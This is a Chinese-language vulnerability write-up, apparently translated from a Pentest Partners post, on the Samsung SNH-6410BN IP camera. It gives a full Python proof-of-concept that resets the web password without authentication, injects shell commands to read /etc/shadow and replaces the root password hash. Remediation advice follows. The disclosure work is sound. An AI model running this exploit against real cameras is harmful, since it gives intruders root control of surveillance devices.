> 原文链接: https://www.anquanke.com//post/id/84396 


# 三星智能监控摄像头被爆远程代码执行漏洞（含POC）


                                阅读量   
                                **167086**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01febe10192e3f58a7.png)](https://p2.ssl.qhimg.com/t01febe10192e3f58a7.png)

**漏洞概况**

EDB-ID:40235

漏洞发现者：PentestPartners

CVE：暂无

发布日期：2016年08月14日

漏洞类型：远程漏洞

受影响平台：系统硬件

受影响App：暂无

漏洞利用POC：[点击下载](https://www.exploit-db.com/download/40235)



**前言**

目前，绝大多数安全研究专家在对物联网设备进行漏洞研究时，都将研究重点集中在了如何利用这些漏洞来展开网络攻击。很少有人知道如何去修复这些安全问题，而且也几乎没人关心如何才能防止这些设备继续遭受攻击。为此，我们专门对一款IP监控摄像头进行了分析，并发现了很多小问题。而将这些安全问题联系在一起，我们就能够获取到目标设备的root访问权限了。虽说它们都是一些小问题，但是修复起来却非常的困难。所以我们认为应该专门写一篇关于如何发现并修复物联网设备漏洞的文章。

我们的研究对象是三星的一款室内IP监控摄像头－[SNH-6410BN](https://www.amazon.co.uk/dp/B00MQS0FZY/ref=pd_lpo_sbs_dp_ss_1?pf_rd_p=569136327&amp;pf_rd_s=lpo-top-stripe&amp;pf_rd_t=201&amp;pf_rd_i=B00J38NVHE&amp;pf_rd_m=A3P5ROKL5A1OLE&amp;pf_rd_r=2AXRQSAPF7Z6CTHDX0FE)。如果单纯从质量和功能性的角度来考察，那么这款摄像头没有任何的问题，因为它的拍摄清晰度非常高，而且三星还为其配备了非常优秀的应用软件。但是，它是一款IP摄像头，所以网络安全的问题就成为了它的一块短版。

通常情况下，用户会使用移动端应用程序或者网站提供的“云服务”来远程访问摄像头。但是这款摄像头使用的仍是SSH，而且还有专门与之对应的Web服务器。这就是我们测试的切入点。因为Web服务器只支持HTTP协议，而不支持使用HTTPS协议。

**<br>**

**漏洞利用代码**

```
# E-DB Note: source ~ https://www.pentestpartners.com/blog/samsungs-smart-camera-a-tale-of-iot-network-security/
 
import urllib, urllib2, crypt, time
 
# New password for web interface
web_password       = 'admin'
# New password for root
root_password  = 'root'
# IP of the camera
ip           = '192.168.12.61'
 
# These are all for the Smartthings bundled camera
realm = 'iPolis'
web_username = 'admin'
base_url = 'http://' + ip + '/cgi-bin/adv/debugcgi?msubmenu=shell&amp;command=ls&amp;command_arg=/...;'
 
 
# Take a command and use command injection to run it on the device
def run_command(command):
       # Convert a normal command into one using bash brace expansion
       # Can't send spaces to debugcgi as it doesn't unescape
       command_brace = '`{`' + ','.join(command.split(' ')) + '`}`'
       command_url = base_url + command_brace
 
       # HTTP digest auth for urllib2
       authhandler = urllib2.HTTPDigestAuthHandler()
       authhandler.add_password(realm, command_url, web_username, web_password)
       opener = urllib2.build_opener(authhandler)
       urllib2.install_opener(opener)
 
       return urllib2.urlopen(command_url)
 
# Step 1 - change the web password using the unauthed vuln found by zenofex
data = urllib.urlencode(`{` 'data' : 'NEW;' + web_password `}`)
urllib2.urlopen('http://' + ip + '/classes/class_admin_privatekey.php', data)
 
# Need to sleep or the password isn't changed
time.sleep(1)
 
# Step 2 - find the current root password hash
shadow = run_command('cat /etc/shadow')
 
for line in shadow:
       if line.startswith('root:'):
              current_hash = line.split(':')[1]
 
# Crypt the new password
new_hash = crypt.crypt(root_password, '00')
 
# Step 3 - Use sed to search and replace the old for new hash in the passwd
# This is done because the command injection doesn't allow a lot of different URL encoded chars
run_command('sed -i -e s/' + current_hash + '/' + new_hash + '/g /etc/shadow')
 
# Step 4 - check that the password has changed
shadow = run_command('cat /etc/shadow')
 
for line in shadow:
       if line.startswith('root:'):
              current_hash = line.split(':')[1]
 
if current_hash &lt;&gt; new_hash:
       print 'Error! - password not changed'
 
# Step 5 - ssh to port 1022 with new root password!
```

**问题一**

问题描述：用户在访问设备时，网络通信数据并没有进行传输加密处理，所以用户的凭证和数据在传输的过程中，安全性无法得到任何保障，攻击者可以随意拦截并篡改用户数据。

解决方案：在信息传输的过程中，尽可能地使用安全协议，并为每一台设备分配随机密钥。

Web接口只使用了一个“私人密钥”来提供基本的安全保障。这个“私人密钥”只是一个密码口令，缺少与之对应的用户名。

**问题二**

问题描述：由于只提供了一个用于访问Web服务的用户账号，这也就意味着攻击者一旦破解了这一账号，他就能够获取到用户功能的完整控制权。

解决方案：为设备部署细粒度的访问控制机制，对用户权限进行划分。这样一来，即便一个普通的账号被攻击了，也不会导致设备彻底被攻击者控制。

当用户首次连接设备时，用户需要设置一个密码。虽然Web接口提供了这一功能，但是产品说明中并没有提及到，所以用户基本上都会直接忽略这一步操作。

**问题三**

问题描述：如果用户没有意识到产品提供了相应的Web接口，那么攻击者就可以连接设备，并设置访问密码，然后得到设备的完整控制权。

解决方案：禁用那些平时不会用到的功能，但是当用户需要开启某些很少使用的功能时，可以很方便地开启。

在2014年，[Exploitee.rs](https://www.exploitee.rs/index.php/Main_Page)的Zenofex（@[Zenofex](https://twitter.com/zenofex)）在三星的另一款摄像头产品中发现了一种能够重置“私人密钥”的方法。尽管他已经将该问题报告给了三星公司，但是这一新款的摄像头产品中仍然存在相同的漏洞。

这个漏洞存在于/classes/admin_set_privatekey.php文件之中。这段代码可以为用户设置新的“私钥”，但是代码并不会检测系统此前是否已经设置过“私钥”了。所以攻击者就可以随意修改目标设备的“私钥”。

下面这部分PHP代码段即为系统用于设置“私钥”的初始代码：

[![](https://p4.ssl.qhimg.com/t010b00c46275833313.png)](https://p4.ssl.qhimg.com/t010b00c46275833313.png)

对比下面这段系统用于修改“私钥”的代码段，其中的检测代码在下图中用红色的字体标出：

[![](https://p4.ssl.qhimg.com/t01c7973ba8e7576964.png)](https://p4.ssl.qhimg.com/t01c7973ba8e7576964.png)

因此，我们只需要向IP摄像头发送一个简单的请求，就可以重置其访问私钥了：

[![](https://p3.ssl.qhimg.com/t01bed9dbedd983c7af.png)](https://p3.ssl.qhimg.com/t01bed9dbedd983c7af.png)

这样一来，我们就可以跟普通用户一样去访问设备的Web接口了。但是这只是我们的第一步，我们的最终目标是得到root shell。

**问题四**

问题描述：未经身份验证的攻击者可以重置摄像头，并获取到摄像头的控制权。

解决方案：确保摄像头的重要功能都有相应的授权控制来进行保护，而且授权控制机制中不存在逻辑错误等问题。

除了之前的问题之外，Exploitee.rs的Zenofex还在Web接口中的一个表单中（WEP密钥域）发现了一个命令注入漏洞。奇怪的是，新款的摄像头中并不存在这个问题（但是密码重置漏洞仍然存在）。为什么三星只修复了其中的一个漏洞，而另一个漏洞却没人管呢？

这个问题暂且不讨论，我们现在要做的就是想办法黑入摄像头。我们可以采用黑盒测试的方法来对摄像头进行分析，而这种方法也是我们在处理大多数web应用程序时所采用的方法。

现在，我们已经占据了上风－因为我们不仅可以查看摄像头的系统固件，而且还可以分析其内部文件了。

我们可以从三星的官方网站中下载系统固件（tgz文件），解压之后我们会得到如下图所示的文件：

[![](https://p1.ssl.qhimg.com/t017d5946306d11ddb3.png)](https://p1.ssl.qhimg.com/t017d5946306d11ddb3.png)

**问题五**

问题描述：固件没有受到任何安全机制的保护，文件也没有进行加密处理，所以我们可以直接对其进行逆向分析。

解决方案：采取数据加密等手段来保护系统固件，以防止攻击者对固件代码进行逆向分析。

首先，我们对ramdisk（虚拟磁盘）文件进行分析－从文件的后缀名来看，这是一个gzip压缩文件。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0158f159cf6477f572.png)

这是一个ext2文件系统。所以我们可以直接挂载该文件：

[![](https://p4.ssl.qhimg.com/t0117df931b1d22da99.png)](https://p4.ssl.qhimg.com/t0117df931b1d22da99.png)

我们似乎已经得到了root文件系统中的内容。接下来让我们看一看，root用户是否已经被启用：

[![](https://p4.ssl.qhimg.com/t01bcf49870778abfce.png)](https://p4.ssl.qhimg.com/t01bcf49870778abfce.png)

**问题六**

问题描述：固件只开启了一个系统用户－即“root”。如果攻击者成功获取到了系统用户的凭证，那么他也就获取到了设备的root访问权限。

解决方案：遵循最小特权的原则，对于那些支持外部服务的用户账号，设备要对这些账号的访问权限进行限制。除非有需要，否则不允许这些账号只使用密码来登录设备。

系统在对密码进行哈希处理时所采用的[哈希算法](https://en.wikipedia.org/wiki/Crypt_(C)#Traditional_DES-based_scheme)其安全性较弱，它最多只支持使用8个字符，这也就使得暴力破解等攻击变得非常的容易。

**问题七**

问题描述：由于系统所选择的哈希算法安全性较弱，这也就意味着系统使用的是弱密码。所以攻击者可以通过其它方式来获取到所有安装了这一固件的摄像头root访问密码。

解决方案：使用md5或者sha512哈希算法来从一定程度上增加暴力破解所需的时间。

既然我们已经可以访问固件的文件系统了，那么我们就可以尝试找出负责处理用户输入数据的部分。对于嵌入式系统而言，如果没有对用户的输入数据进行控制和检测，那么用户的输入信息将会成为一个巨大的安全隐患。

<br>

**总结**

三星公司对于这一问题的响应和处理还是相当不错的。他们非常清楚地了解我们所说的安全问题，并且已经在下一版本的固件程序中修复了这些安全漏洞。除此之外，Web接口和SSH也已经被禁用了。

虽然他们花了不少时间来处理这个问题，但至少他们给我们提供了反馈信息。现在很多大型的物联网厂商并不会对第三方安全机构所提交的安全报告予以反馈，所以我们在此要表扬一下三星公司。

表扬归表扬，但是这些安全问题并没有全部得到解决。如果想要彻底修复这个远程代码执行漏洞的话，三星只需要彻底移除设备的Web访问接口即可。

**<br>**

**参考链接**

1.SNH-6410BN摄像头－亚马逊商城：

[https://www.amazon.co.uk/dp/B00MQS0FZY/ref=pd_lpo_sbs_dp_ss_1?pf_rd_p=569136327&amp;pf_rd_s=lpo-top-stripe&amp;pf_rd_t=201&amp;pf_rd_i=B00J38NVHE&amp;pf_rd_m=A3P5ROKL5A1OLE&amp;pf_rd_r=2AXRQSAPF7Z6CTHDX0FE](https://www.amazon.co.uk/dp/B00MQS0FZY/ref=pd_lpo_sbs_dp_ss_1?pf_rd_p=569136327&amp;pf_rd_s=lpo-top-stripe&amp;pf_rd_t=201&amp;pf_rd_i=B00J38NVHE&amp;pf_rd_m=A3P5ROKL5A1OLE&amp;pf_rd_r=2AXRQSAPF7Z6CTHDX0FE)

2.三星SmartCam官方网站：

[https://www.samsungsmartcam.com/web/cmm/login.do](https://www.samsungsmartcam.com/web/cmm/login.do)

3. 三星SmartCam远程控制App：

[https://play.google.com/store/apps/details?id=com.techwin.shc&amp;hl=en_GB](https://play.google.com/store/apps/details?id=com.techwin.shc&amp;hl=en_GB)

4. Exploitee.rs官方网站：

[https://www.exploitee.rs/index.php/Main_Page](https://www.exploitee.rs/index.php/Main_Page)

5.Zenofex的Twitter主页：

[https://twitter.com/zenofex](https://twitter.com/zenofex)

6.漏洞利用代码（POC）的下载地址：

[https://www.exploit-db.com/download/40235](https://www.exploit-db.com/download/40235)
